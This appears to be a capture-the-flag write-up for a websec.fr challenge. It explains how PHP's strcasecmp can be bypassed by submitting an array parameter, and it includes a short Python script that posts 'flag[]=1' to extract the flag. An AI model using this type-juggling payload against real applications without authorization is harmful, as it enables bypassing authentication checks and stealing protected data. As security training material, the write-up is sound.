# Level17

## Analysis
- this challenge asks us to guess the flag, while introducing random sleeping times to avoid timing attacks
- the provided flag is compared with the flag (imported from `flag.php`)


## Solution
- the flag can not be trivially received by visiting `flag.php` or `flag.phps`
- the vulnerability is caused by `strcasecmp`, which compares a user-controlled data with the actual flag
  - if the check succeeds, the user receives the flag
  - we can make sure that the function returns ``true`` if we provide an array instead of a simple string
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#strcmp-strcasecmp
- the following python script extracts the flag:

```python
import requests
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}
response = requests.post('https://websec.fr/level17/index.php', headers=headers, data='flag[]=1')
print(response.text)
```